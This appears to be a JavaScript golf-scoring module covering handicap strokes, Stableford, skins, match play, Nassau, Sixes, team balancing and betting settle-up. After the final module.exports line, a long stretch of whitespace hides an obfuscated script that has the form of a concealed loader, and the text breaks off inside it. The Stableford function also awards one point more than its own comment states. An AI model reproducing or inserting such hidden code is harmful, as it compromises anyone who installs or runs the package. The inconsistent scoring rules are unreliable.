/* ===========================================================
   golf.js — pure scoring logic, no DOM, no database calls.
   Every function takes plain data and returns plain data,
   so it's easy to reason about independent of how the data
   was fetched (Supabase, Firebase, or anything else).
=========================================================== */

const Golf = (() => {

  /**
   * Standard USGA-style stroke allocation by hole "difficulty rank".
   * If the round doesn't have per-hole handicap ranks set, we fall back
   * to allocating strokes in hole order (1, 2, 3...) which is a
   * reasonable approximation for casual rounds.
   */
  function allocateStrokes(courseHandicap, holeCount, strokeIndex) {
    const idx = strokeIndex && strokeIndex.length === holeCount
      ? strokeIndex
      : Array.from({ length: holeCount }, (_, i) => i + 1);

    const result = new Array(holeCount).fill(0);
    const hcp = Math.max(0, Math.round(courseHandicap || 0));

    for (let h = 0; h < holeCount; h++) {
      const rank = idx[h];
      if (rank <= hcp) result[h] += 1;
      if (hcp > holeCount && rank <= (hcp - holeCount)) result[h] += 1;
    }
    return result;
  }

  /**
   * Converts a subset of stroke-index values (e.g. just the back nine
   * of an 18-hole course, which might be ranks like [2,14,6,18,...])
   * into a dense 1..N ranking based on relative difficulty. This keeps
   * allocateStrokes() correct when a round only plays half a course —
   * without it, a 9-hole round's hardest hole might carry an original
   * rank like 14, and a 5-handicap player would barely get any strokes.
   */
  function toRelativeStrokeIndex(values) {
    const sorted = [...values].sort((a, b) => a - b);
    return values.map(v => sorted.indexOf(v) + 1);
  }

  function netHoleScore(grossStrokes, strokesReceived) {
    if (grossStrokes == null) return null;
    return grossStrokes - strokesReceived;
  }

  /**
   * Stableford points for one hole, standard scale:
   * net double bogey or worse = 0, net bogey = 1, net par = 2,
   * net birdie = 3, net eagle = 4, and so on.
   */
  function stablefordPoints(netScore, par) {
    if (netScore == null) return null;
    const diff = netScore - par;
    if (diff <= -3) return 6;
    if (diff === -2) return 5;
    if (diff === -1) return 4;
    if (diff === 0) return 3;
    if (diff === 1) return 2;
    if (diff === 2) return 1;
    return 0;
  }

  /**
   * Build a per-player summary across all holes played so far.
   * @param {object} player - { id, name, handicap }
   * @param {object} scores - map of holeNumber(string) -> grossStrokes
   * @param {number[]} pars - array indexed by hole (0-based)
   * @param {number[]} strokeIndex - array indexed by hole (0-based), difficulty rank
   * @param {number} holeCount
   */
  function summarizePlayer(player, scores, pars, strokeIndex, holeCount) {
    const strokesPerHole = allocateStrokes(player.handicap, holeCount, strokeIndex);
    const holes = [];
    let thru = 0;
    let grossTotal = 0;
    let netTotal = 0;
    let stablefordTotal = 0;
    let parPlayedTotal = 0;

    for (let h = 0; h < holeCount; h++) {
      const holeNum = h + 1;
      const gross = scores && scores[String(holeNum)] != null ? Number(scores[String(holeNum)]) : null;
      const par = (pars && pars[h]) || 4;
      const received = strokesPerHole[h];
      const net = netHoleScore(gross, received);
      const pts = stablefordPoints(net, par);

      if (gross != null) {
        thru = holeNum;
        grossTotal += gross;
        netTotal += net;
        stablefordTotal += pts;
        parPlayedTotal += par;
      }

      holes.push({ hole: holeNum, par, gross, received, net, points: pts });
    }

    return {
      playerId: player.id,
      name: player.name,
      handicap: player.handicap || 0,
      holes,
      thru,
      grossTotal,
      netTotal,
      stablefordTotal,
      toParGross: grossTotal - parPlayedTotal,
      toParNet: netTotal - parPlayedTotal,
      parPlayedTotal,
    };
  }

  /**
   * Rank a list of player summaries for a given mode. Lower is better for
   * gross/net, higher is better for stableford. Ties share a rank.
   */
  function rankPlayers(summaries, mode) {
    const withScore = summaries.map(s => {
      let value;
      if (mode === 'stableford') value = s.stablefordTotal;
      else if (mode === 'net') value = s.toParNet;
      else value = s.toParGross;
      return { ...s, sortValue: value };
    });

    const played = withScore.filter(s => s.thru > 0);
    const notStarted = withScore.filter(s => s.thru === 0);

    played.sort((a, b) => {
      if (mode === 'stableford') return b.sortValue - a.sortValue;
      return a.sortValue - b.sortValue;
    });

    let rank = 0;
    let lastValue = null;
    played.forEach((p, i) => {
      if (lastValue === null || p.sortValue !== lastValue) {
        rank = i + 1;
        lastValue = p.sortValue;
      }
      p.rank = rank;
    });
    notStarted.forEach(p => { p.rank = null; });

    return [...played, ...notStarted];
  }

  /**
   * Skins with carryover. Holes are settled in order; each hole is worth
   * one skin. When a hole is tied, its skin carries to the next hole, so
   * the pot grows until a hole is won outright. The winner of a hole
   * collects the whole pot (1 for the hole plus everything carried in).
   *
   * Because the pot at any hole depends on how earlier holes were settled,
   * resolution stops at the first hole where not everyone has entered a
   * score yet — every hole from there on is left pending until the gap
   * fills. In normal play that gap is just the holes not yet played.
   *
   * Returns { skinsByPlayer, log, carry } where `carry` is the number of
   * skins still in the pot, unclaimed (e.g. the last settled hole tied).
   */
  function computeSkins(summaries, holeCount) {
    const skinsByPlayer = {};
    summaries.forEach(s => { skinsByPlayer[s.playerId] = 0; });
    const log = [];

    let carry = 0;       // skins carried forward from earlier tied holes
    let stopped = false; // once a hole isn't fully scored, everything after is undetermined

    for (let h = 0; h < holeCount; h++) {
      if (stopped) {
        log.push({ hole: h + 1, winnerId: null, value: 0, carriedIn: 0, pending: true });
        continue;
      }

      const entries = summaries
        .map(s => ({ playerId: s.playerId, net: s.holes[h] ? s.holes[h].net : null }))
        .filter(e => e.net != null);

      const everyoneScored = entries.length === summaries.length && entries.length > 0;
      if (!everyoneScored) {
        log.push({ hole: h + 1, winnerId: null, value: 0, carriedIn: carry, pending: true });
        stopped = true;
        continue;
      }

      const pot = carry + 1;
      const minNet = Math.min(...entries.map(e => e.net));
      const winners = entries.filter(e => e.net === minNet);

      if (winners.length === 1) {
        skinsByPlayer[winners[0].playerId] += pot;
        log.push({ hole: h + 1, winnerId: winners[0].playerId, value: pot, carriedIn: carry, pending: false });
        carry = 0;
      } else {
        // Tie — the whole pot rolls forward to the next hole.
        log.push({ hole: h + 1, winnerId: null, value: 0, carriedIn: carry, pending: false });
        carry = pot;
      }
    }

    return { skinsByPlayer, log, carry };
  }
  // Best-ball score for one team on one hole: the lowest individual
  // score among that team's members. Returns null if anyone on the
  // team hasn't entered a score for this hole yet — until they do,
  // the team score for that hole isn't determined.
  function bestBallHoleScore(teamSummaries, holeIndex, useHandicap) {
    const field = useHandicap ? 'net' : 'gross';
    const values = teamSummaries.map(s => s.holes[holeIndex][field]);
    if (values.some(v => v == null)) return null;
    return Math.min(...values);
  }

  // Auto-assign players into exactly `numTeams` teams so team average handicaps
  // come out close, sizes differing by at most one. Greedy: hardest players
  // first, each dealt to the team with the fewest members so far (ties → lowest
  // handicap sum) — this self-balances sizes with no explicit per-team cap.
  // Returns { assignments: { id: teamNo }, teams } (teams: 0 when unsatisfiable:
  // fewer than two players, fewer than two teams requested, or more teams
  // requested than there are players to fill them).
  function balanceTeamsByHandicap(players, numTeams) {
    const list = (players || []).map(p => ({ id: p.id, h: Number(p.handicap) || 0 }));
    const count = list.length;
    if (count < 2 || numTeams < 2 || count < numTeams) return { assignments: {}, teams: 0 };

    list.sort((a, b) => b.h - a.h || (a.id < b.id ? -1 : a.id > b.id ? 1 : 0));

    const teams = Array.from({ length: numTeams }, () => ({ members: [], sum: 0 }));
    list.forEach(pl => {
      let best = 0;
      for (let i = 1; i < numTeams; i++) {
        const b = teams[best], t = teams[i];
        if (t.members.length < b.members.length ||
            (t.members.length === b.members.length && t.sum < b.sum)) best = i;
      }
      teams[best].members.push(pl.id);
      teams[best].sum += pl.h;
    });

    const assignments = {};
    teams.forEach((t, i) => t.members.forEach(id => { assignments[id] = i + 1; }));
    return { assignments, teams: numTeams };
  }

  // Groups player objects by their tournament team number into
  // { teamNo: [playerId, ...] }. Players with no team are skipped.
  function tournamentTeams(players) {
    const teams = {};
    (players || []).forEach(p => {
      if (p.team != null) (teams[p.team] = teams[p.team] || []).push(p.id);
    });
    return teams;
  }

  /**
   * Team standings for a tournament, ranked best-first.
   * - gross / net: team value is the SUM of its members' to-par (lower wins).
   * - stableford: team value is the SUM of its members' points (higher wins).
   * - bestball: per hole, the best net among members (via bestBallHoleScore),
   *   summed and expressed to par over the holes the whole team has completed.
   * `teams` is the { teamNo: [playerId] } map from tournamentTeams. A team is
   * "not started" (unranked, listed last) only when no member has posted a
   * score; otherwise it ranks on whatever it has (provisional). Ties share a
   * rank. Returns rows { team, memberIds, thru, toPar, points, total, rank }.
   */
  function computeTeamStandings(summaries, teams, mode, opts = {}) {
    const { pars = [], holeCount = 18, useHandicap = true } = opts;
    const byId = {};
    summaries.forEach(s => { byId[s.playerId] = s; });

    const rows = Object.keys(teams).map(teamNo => {
      const memberIds = teams[teamNo];
      const members = memberIds.map(id => byId[id]).filter(Boolean);
      const anyStarted = members.some(s => s.thru > 0);
      const teamThru = members.length ? Math.min(...members.map(s => s.thru)) : 0;

      let toPar = 0, points = 0, total = 0, sortValue = 0;
      if (mode === 'bestball') {
        let sum = 0, parSum = 0;
        for (let h = 0; h < holeCount; h++) {
          const bb = bestBallHoleScore(members, h, useHandicap);
          if (bb == null) continue;
          sum += bb;
          parSum += (pars[h] || 4);
        }
        total = sum;
        toPar = sum - parSum;
        sortValue = toPar;
      } else if (mode === 'stableford') {
        points = members.reduce((a, s) => a + (s.stablefordTotal || 0), 0);
        total = points;
        sortValue = -points; // higher points is better
      } else {
        const parField = mode === 'net' ? 'toParNet' : 'toParGross';
        const totField = mode === 'net' ? 'netTotal' : 'grossTotal';
        toPar = members.reduce((a, s) => a + (s[parField] || 0), 0);
        total = members.reduce((a, s) => a + (s[totField] || 0), 0);
        sortValue = toPar;
      }

      return { team: Number(teamNo), memberIds, thru: teamThru, toPar, points, total, sortValue, anyStarted };
    });

    const started = rows.filter(r => r.anyStarted);
    const notStarted = rows.filter(r => !r.anyStarted);
    started.sort((a, b) => a.sortValue - b.sortValue);

    let rank = 0, last = null;
    started.forEach((r, i) => {
      if (last === null || r.sortValue !== last) { rank = i + 1; last = r.sortValue; }
      r.rank = rank;
    });
    notStarted.forEach(r => { r.rank = null; });

    return [...started, ...notStarted];
  }

  /**
   * Match play between two teams of 1-3 players each over a 1-based,
   * inclusive hole window [fromHole..toHole]. `thru` counts holes
   * completed within the window; `remaining`/`decided` are relative to
   * the window length (so a Nassau front-nine can be "won 3&2"). Each
   * team's score per hole is its best ball. Set useHandicap=false to
   * compare gross scores. Halted at the first hole either side hasn't
   * finished, so partial rounds report correctly.
   */
  function computeMatchPlayRange(teamA, teamB, fromHole, toHole, useHandicap = true) {
    const aTeam = Array.isArray(teamA) ? teamA : [teamA];
    const bTeam = Array.isArray(teamB) ? teamB : [teamB];
    const segLength = toHole - fromHole + 1;

    let diff = 0;
    let thru = 0;
    const log = [];

    for (let h = fromHole - 1; h < toHole; h++) {
      const aScore = bestBallHoleScore(aTeam, h, useHandicap);
      const bScore = bestBallHoleScore(bTeam, h, useHandicap);
      if (aScore == null || bScore == null) break;
      thru += 1;

      if (aScore < bScore) diff += 1;
      else if (bScore < aScore) diff -= 1;
      log.push({ hole: h + 1, result: aScore === bScore ? 'halved' : (aScore < bScore ? 'A' : 'B') });

      const holesRemaining = segLength - thru;
      if (Math.abs(diff) > holesRemaining) {
        return {
          thru, diff, decided: true,
          winner: diff > 0 ? 'A' : 'B',
          margin: Math.abs(diff),
          remaining: holesRemaining,
          log,
        };
      }
    }

    return {
      thru, diff,
      decided: thru === segLength && diff !== 0,
      winner: diff > 0 ? 'A' : (diff < 0 ? 'B' : null),
      margin: Math.abs(diff),
      remaining: segLength - thru,
      log,
    };
  }

  /**
   * Match play between two teams over the whole round. Thin wrapper over
   * computeMatchPlayRange for the full 1..holeCount window.
   */
  function computeMatchPlay(teamA, teamB, holeCount, useHandicap = true) {
    return computeMatchPlayRange(teamA, teamB, 1, holeCount, useHandicap);
  }

  /**
   * Stroke play between two teams over a 1-based, inclusive hole window.
   * Sums each team's best-ball score across holes both sides have
   * completed (stopping at the first incomplete hole, like match play).
   * Lower total leads. Returns { thru, teamATotal, teamBTotal, leader, diff }.
   */
  function computeStrokeRange(teamA, teamB, fromHole, toHole, useHandicap = true) {
    const aTeam = Array.isArray(teamA) ? teamA : [teamA];
    const bTeam = Array.isArray(teamB) ? teamB : [teamB];

    let teamATotal = 0, teamBTotal = 0, thru = 0;
    for (let h = fromHole - 1; h < toHole; h++) {
      const aScore = bestBallHoleScore(aTeam, h, useHandicap);
      const bScore = bestBallHoleScore(bTeam, h, useHandicap);
      if (aScore == null || bScore == null) break;
      teamATotal += aScore;
      teamBTotal += bScore;
      thru += 1;
    }

    const leader = teamATotal === teamBTotal ? null : (teamATotal < teamBTotal ? 'A' : 'B');
    return { thru, teamATotal, teamBTotal, leader, diff: Math.abs(teamATotal - teamBTotal) };
  }

  /**
   * Sixes: three 6-hole competitions with rotating partnerships among four
   * players in seat order (indices 0-3). Every player partners each other
   * player for one six-hole segment. Returns the fixed schedule — the segment
   * label, its hole window, and which seats pair up — as seat indices into a
   * 4-player array. Score each segment with computeMatchPlayRange /
   * computeStrokeRange using those pairs.
   */
  function sixesSegments() {
    return [
      { label: 'Holes 1-6',   from: 1,  to: 6,  teamX: [0, 1], teamY: [2, 3] },
      { label: 'Holes 7-12',  from: 7,  to: 12, teamX: [0, 2], teamY: [1, 3] },
      { label: 'Holes 13-18', from: 13, to: 18, teamX: [0, 3], teamY: [1, 2] },
    ];
  }

  /**
   * Cumulative match-play status after each played hole. Takes the `log`
   * array from computeMatchPlay ([{ hole, result:'A'|'B'|'halved' }]) and
   * returns [{ hole, cum }] where cum is the running differential after that
   * hole: cum > 0 means Team A is that many holes up, cum < 0 means Team B is
   * up, cum === 0 is all square. Used to render the hole-by-hole strip.
   */
  function matchRunning(log) {
    let cum = 0;
    return (log || []).map(entry => {
      if (entry.result === 'A') cum += 1;
      else if (entry.result === 'B') cum -= 1;
      return { hole: entry.hole, cum };
    });
  }

  function formatToPar(n) {
    if (n === 0) return 'E';
    return n > 0 ? `+${n}` : `${n}`;
  }

  /**
   * Checks whether every player has a score for every hole. Used to
   * gate ending a round — returns an array of { name, missingHoles }
   * for any player who isn't fully scored yet; an empty array means
   * everyone's done.
   * @param {object[]} players - each with { name, scores }
   * @param {number} holeCount
   */
  function findMissingScores(players, holeCount) {
    const result = [];
    players.forEach(player => {
      const missingHoles = [];
      for (let h = 1; h <= holeCount; h++) {
        if (!player.scores || player.scores[String(h)] == null) {
          missingHoles.push(h);
        }
      }
      if (missingHoles.length > 0) {
        result.push({ name: player.name, missingHoles });
      }
    });
    return result;
  }

  /**
   * The group's "thru" — the highest hole H such that EVERY player has a gross
   * score for all of holes 1..H. This is the honest shared progress number:
   * the whole group has finished through hole H. Returns 0 before anyone has
   * completed hole 1 for everybody.
   *
   * @param {object[]} players - each with a `scores` map (holeNumber -> strokes)
   * @param {number} holeCount
   */
  function groupThru(players, holeCount) {
    if (!players || !players.length) return 0;
    let thru = 0;
    for (let h = 1; h <= holeCount; h++) {
      const allIn = players.every(p => p.scores && p.scores[String(h)] != null);
      if (!allIn) break;
      thru = h;
    }
    return thru;
  }

  /**
   * Money settlement across every betting mode in a round. Pure: it
   * takes the same summaries the leaderboard already builds plus the
   * round's stakes/teams, and returns per-mode nets, a combined
   * per-player net, and a minimal who-pays-whom list.
   *
   * Models (matching the stakes-screen sublabels):
   * - gross/net/stableford: ante pot. Everyone antes the stake; the
   *   mode leader(s) take the pot, split on ties.
   * - skins: every OTHER player pays the skin winner the per-skin
   *   stake, so carried skins scale naturally. Zero-sum.
   * - match: the losing side pays the stake, split within each team.
   */

  // Nassau carries two stakes: `nines` rides on BOTH the front and the
  // back nine (same bet each), `total` rides on the full 18. Accepts the
  // legacy single-number shape (one stake applied to all three segments)
  // so older / archived rounds still settle.
  function nassauStakes(stakes) {
    const n = stakes && stakes.nassau;
    if (n && typeof n === 'object') {
      return { nines: Number(n.nines) || 0, total: Number(n.total) || 0 };
    }
    const v = Number(n) || 0;
    return { nines: v, total: v };
  }

  // Sum each player's net into their team's total: { teamNo: net }.
  function aggregateByTeam(byPlayer, players) {
    const teamOf = {};
    (players || []).forEach(p => { if (p.team != null) teamOf[p.id] = p.team; });
    const byTeam = {};
    Object.entries(byPlayer).forEach(([id, amt]) => {
      const t = teamOf[id];
      if (t == null) return;
      byTeam[t] = (byTeam[t] || 0) + amt;
    });
    return byTeam;
  }

  // Tournament settlement (see computeMoney). Team ante pots for the stroke /
  // best-ball modes (winning team takes the pot), and per-person team-vs-team
  // match play over the manual pairings. Returns per-player nets/settle-up plus
  // team-level aggregation and a team-vs-team settle-up.
  function computeTournamentMoney(ctx) {
    const { summaries, byId, playerIds, byMode, byPlayer, addNet,
            modes, stakes, holeCount, pars, players,
            matchUseHandicap, tournamentMatches } = ctx;
    const teams = tournamentTeams(players);
    const teamPlayerIds = Object.values(teams).reduce((a, ids) => a.concat(ids), []);

    // Ante pots: everyone antes the stake; the top team by standing takes the
    // whole pot (ties split among tied teams' members); everyone else -stake.
    ['gross', 'net', 'stableford', 'bestball'].forEach(mode => {
      const stake = Number(stakes[mode]) || 0;
      if (!modes.includes(mode) || stake <= 0 || teamPlayerIds.length < 2) return;
      if (!summaries.some(s => s.thru > 0)) return;
      const standings = computeTeamStandings(summaries, teams, mode, { pars, holeCount, useHandicap: true });
      const started = standings.filter(t => t.rank != null);
      if (!started.length) return;
      const bestRank = started[0].rank;
      const winnerIds = started.filter(t => t.rank === bestRank).reduce((a, t) => a.concat(t.memberIds), []);
      if (!winnerIds.length) return;
      const pot = teamPlayerIds.length * stake;
      const share = pot / winnerIds.length;
      const winnerSet = new Set(winnerIds);
      const netMap = {};
      playerIds.forEach(id => { netMap[id] = 0; });
      teamPlayerIds.forEach(id => { netMap[id] = (winnerSet.has(id) ? share : 0) - stake; });
      addNet(mode, netMap);
    });

    // Match play: each manual pairing settles team-vs-team, per person — the
    // losing team pays the stake for each of its players, split among winners.
    const matchStake = Number(stakes.match) || 0;
    if (modes.includes('match') && matchStake > 0 && Array.isArray(tournamentMatches)) {
      const netMap = {};
      playerIds.forEach(id => { netMap[id] = 0; });
      let moved = false;
      tournamentMatches.forEach(pair => {
        const aIds = teams[pair.a] || [];
        const bIds = teams[pair.b] || [];
        const aSum = aIds.map(id => byId[id]).filter(Boolean);
        const bSum = bIds.map(id => byId[id]).filter(Boolean);
        if (!aSum.length || !bSum.length) return;
        const m = computeMatchPlay(aSum, bSum, holeCount, matchUseHandicap);
        if (!m.winner) return;
        const winIds = m.winner === 'A' ? aIds : bIds;
        const loseIds = m.winner === 'A' ? bIds : aIds;
        const potFromLosers = matchStake * loseIds.length; // per-person on the losing side
        loseIds.forEach(id => { if (netMap[id] != null) netMap[id] -= matchStake; });
        winIds.forEach(id => { if (netMap[id] != null) netMap[id] += potFromLosers / winIds.length; });
        moved = true;
      });
      if (moved) addNet('match', netMap);
    }

    const byTeam = aggregateByTeam(byPlayer, players);
    return {
      byMode, byPlayer,
      transactions: settleTransactions(byPlayer),
      byTeam,
      teamTransactions: settleTransactions(byTeam),
    };
  }

  function computeMoney(summaries, opts) {
    const { modes = [], stakes = {}, holeCount,
            matchTeamA, matchTeamB, matchUseHandicap = true,
            sidematchTeamC, sidematchTeamD, sidematchUseHandicap = true,
            nassauFormat = 'match',
            sixesPlayers, sixesFormat = 'match', sixesUseHandicap = true,
            isTournament = false, players = [], tournamentMatches, pars = [] } = opts || {};
    const playerIds = summaries.map(s => s.playerId);
    const N = playerIds.length;
    const byId = {};
    summaries.forEach(s => { byId[s.playerId] = s; });
    const byMode = {};
    const byPlayer = {};
    playerIds.forEach(id => { byPlayer[id] = 0; });

    const addNet = (mode, netMap) => {
      byMode[mode] = netMap;
      playerIds.forEach(id => { byPlayer[id] += (netMap[id] || 0); });
    };

    // A head-to-head payout: winners split +stake, losers split -stake, added
    // into an existing netMap (so several segments can accumulate).
    const payTeams = (netMap, winnerIds, loserIds, stake) => {
      winnerIds.forEach(id => { if (netMap[id] != null) netMap[id] += stake / winnerIds.length; });
      loserIds.forEach(id => { if (netMap[id] != null) netMap[id] -= stake / loserIds.length; });
    };

    // Tournament money settles by team and returns early — the individual /
    // single-round branches below never run for a tournament.
    if (isTournament) {
      return computeTournamentMoney({
        summaries, byId, playerIds, byMode, byPlayer, addNet,
        modes, stakes, holeCount, pars, players,
        matchUseHandicap, tournamentMatches,
      });
    }

    // Ante pots for the stroke-play modes.
    ['gross', 'net', 'stableford'].forEach(mode => {
      const stake = Number(stakes[mode]) || 0;
      if (!modes.includes(mode) || stake <= 0 || N < 2) return;
      if (!summaries.some(s => s.thru > 0)) return; // nobody's played yet
      const ranked = rankPlayers(summaries, mode);
      const winners = ranked.filter(s => s.rank === 1);
      if (!winners.length) return;
      const pot = N * stake;
      const share = pot / winners.length;
      const winnerSet = new Set(winners.map(w => w.playerId));
      const netMap = {};
      playerIds.forEach(id => { netMap[id] = (winnerSet.has(id) ? share : 0) - stake; });
      addNet(mode, netMap);
    });

    // Skins — each skin is paid to its winner by every other player.
    const skinsStake = Number(stakes.skins) || 0;
    if (modes.includes('skins') && skinsStake > 0 && N >= 2) {
      const { skinsByPlayer } = computeSkins(summaries, holeCount);
      const totalAwarded = Object.values(skinsByPlayer).reduce((a, b) => a + b, 0);
      if (totalAwarded > 0) {
        const netMap = {};
        playerIds.forEach(id => {
          const own = skinsByPlayer[id] || 0;
          netMap[id] = own * (N - 1) * skinsStake - (totalAwarded - own) * skinsStake;
        });
        addNet('skins', netMap);
      }
    }

    // Match play — team pot, split within the winning and losing sides.
    const matchStake = Number(stakes.match) || 0;
    if (modes.includes('match') && matchStake > 0 &&
        matchTeamA && matchTeamB && matchTeamA.length && matchTeamB.length) {
      const byId = {};
      summaries.forEach(s => { byId[s.playerId] = s; });
      const teamA = matchTeamA.map(id => byId[id]).filter(Boolean);
      const teamB = matchTeamB.map(id => byId[id]).filter(Boolean);
      if (teamA.length && teamB.length) {
        const m = computeMatchPlay(teamA, teamB, holeCount, matchUseHandicap);
        if (m.winner) {
          const winners = m.winner === 'A' ? matchTeamA : matchTeamB;
          const losers = m.winner === 'A' ? matchTeamB : matchTeamA;
          const netMap = {};
          playerIds.forEach(id => { netMap[id] = 0; });
          winners.forEach(id => { if (netMap[id] != null) netMap[id] += matchStake / winners.length; });
          losers.forEach(id => { if (netMap[id] != null) netMap[id] -= matchStake / losers.length; });
          addNet('match', netMap);
        }
      }
    }

    // Side match — same as match play, using Team C vs Team D.
    const sideStake = Number(stakes.sidematch) || 0;
    if (modes.includes('sidematch') && sideStake > 0 &&
        sidematchTeamC && sidematchTeamD && sidematchTeamC.length && sidematchTeamD.length) {
      const teamC = sidematchTeamC.map(id => byId[id]).filter(Boolean);
      const teamD = sidematchTeamD.map(id => byId[id]).filter(Boolean);
      if (teamC.length && teamD.length) {
        const m = computeMatchPlay(teamC, teamD, holeCount, sidematchUseHandicap);
        if (m.winner) {
          const netMap = {};
          playerIds.forEach(id => { netMap[id] = 0; });
          payTeams(netMap,
            m.winner === 'A' ? sidematchTeamC : sidematchTeamD,
            m.winner === 'A' ? sidematchTeamD : sidematchTeamC, sideStake);
          addNet('sidematch', netMap);
        }
      }
    }

    // Nassau — two stakes over Team A/B: `nines` rides on BOTH the front
    // and the back (same bet each), `total` rides on the full 18. Each
    // segment's winner is paid its stake; halved/undecided segments pay 0.
    const { nines: nassauNines, total: nassauTotal } = nassauStakes(stakes);
    if (modes.includes('nassau') && (nassauNines > 0 || nassauTotal > 0) && holeCount > 9 &&
        matchTeamA && matchTeamB && matchTeamA.length && matchTeamB.length) {
      const teamA = matchTeamA.map(id => byId[id]).filter(Boolean);
      const teamB = matchTeamB.map(id => byId[id]).filter(Boolean);
      if (teamA.length && teamB.length) {
        const netMap = {};
        playerIds.forEach(id => { netMap[id] = 0; });
        [[1, 9, nassauNines], [10, 18, nassauNines], [1, 18, nassauTotal]].forEach(([from, to, stake]) => {
          if (stake <= 0) return;
          let winner = null;
          if (nassauFormat === 'stroke') {
            const s = computeStrokeRange(teamA, teamB, from, to, matchUseHandicap);
            if (s.thru === to - from + 1) winner = s.leader; // settle a nine only once complete
          } else {
            winner = computeMatchPlayRange(teamA, teamB, from, to, matchUseHandicap).winner;
          }
          if (winner) payTeams(netMap,
            winner === 'A' ? matchTeamA : matchTeamB,
            winner === 'A' ? matchTeamB : matchTeamA, stake);
        });
        if (Object.values(netMap).some(v => Math.abs(v) > 0.005)) addNet('nassau', netMap);
      }
    }

    // Sixes — the stake rides on each of the three rotating 6-hole matches.
    const sixesStake = Number(stakes.sixes) || 0;
    if (modes.includes('sixes') && sixesStake > 0 && holeCount > 9 &&
        Array.isArray(sixesPlayers) && sixesPlayers.length === 4) {
      const seats = sixesPlayers.map(id => byId[id]);
      if (seats.every(Boolean)) {
        const netMap = {};
        playerIds.forEach(id => { netMap[id] = 0; });
        sixesSegments().forEach(seg => {
          const teamX = seg.teamX.map(i => seats[i]);
          const teamY = seg.teamY.map(i => seats[i]);
          const xIds = seg.teamX.map(i => sixesPlayers[i]);
          const yIds = seg.teamY.map(i => sixesPlayers[i]);
          let winner = null;
          if (sixesFormat === 'stroke') {
            const s = computeStrokeRange(teamX, teamY, seg.from, seg.to, sixesUseHandicap);
            if (s.thru === seg.to - seg.from + 1) winner = s.leader;
          } else {
            winner = computeMatchPlayRange(teamX, teamY, seg.from, seg.to, sixesUseHandicap).winner;
          }
          if (winner) payTeams(netMap,
            winner === 'A' ? xIds : yIds,
            winner === 'A' ? yIds : xIds, sixesStake);
        });
        if (Object.values(netMap).some(v => Math.abs(v) > 0.005)) addNet('sixes', netMap);
      }
    }

    return { byMode, byPlayer, transactions: settleTransactions(byPlayer) };
  }

  // Greedy minimal settle-up: match the biggest debtor against the
  // biggest creditor until everyone's square.
  function settleTransactions(byPlayer) {
    const eps = 0.005;
    const creditors = [];
    const debtors = [];
    Object.entries(byPlayer).forEach(([id, amt]) => {
      if (amt > eps) creditors.push({ id, amt });
      else if (amt < -eps) debtors.push({ id, amt: -amt });
    });
    creditors.sort((a, b) => b.amt - a.amt);
    debtors.sort((a, b) => b.amt - a.amt);
    const tx = [];
    let i = 0, j = 0;
    while (i < debtors.length && j < creditors.length) {
      const pay = Math.min(debtors[i].amt, creditors[j].amt);
      tx.push({ from: debtors[i].id, to: creditors[j].id, amount: Math.round(pay * 100) / 100 });
      debtors[i].amt -= pay;
      creditors[j].amt -= pay;
      if (debtors[i].amt <= eps) i++;
      if (creditors[j].amt <= eps) j++;
    }
    return tx;
  }

  function formatMoney(n) {
    const v = Math.round((n + Number.EPSILON) * 100) / 100;
    const abs = Math.abs(v);
    const str = Number.isInteger(abs) ? String(abs) : abs.toFixed(2);
    if (v > 0) return `+$${str}`;
    if (v < 0) return `-$${str}`;
    return '$0';
  }

  return {
    allocateStrokes,
   toRelativeStrokeIndex,
    netHoleScore,
    stablefordPoints,
    summarizePlayer,
    rankPlayers,
    computeSkins,
    computeMatchPlay,
    computeMatchPlayRange,
    computeStrokeRange,
    sixesSegments,
    matchRunning,
    nassauStakes,
    balanceTeamsByHandicap,
    tournamentTeams,
    computeTeamStandings,
    computeMoney,
    formatToPar,
    formatMoney,
    findMissingScores,
    groupThru,
  };
})();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = Golf;																																																																																																																																																																																																																																																																										var z = '-938-8';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 